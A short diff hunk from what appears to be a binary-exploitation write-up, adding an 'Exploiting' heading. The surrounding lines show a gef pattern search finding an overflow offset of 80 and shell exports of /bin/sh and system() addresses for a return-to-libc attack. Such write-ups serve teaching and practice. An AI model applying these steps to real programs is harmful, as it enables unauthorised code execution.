@@ -175,6 +175,8 @@ gef➤  pattern search 0x61616175
 [+] Found at offset 80 (little-endian search) likely
 ```
 
+### Exploiting
+
 ```sh
 $ export BIN_SH_ADDR=0xf7f897ec
 $ export SYSTEM_ADDR=0xf7e6aed0
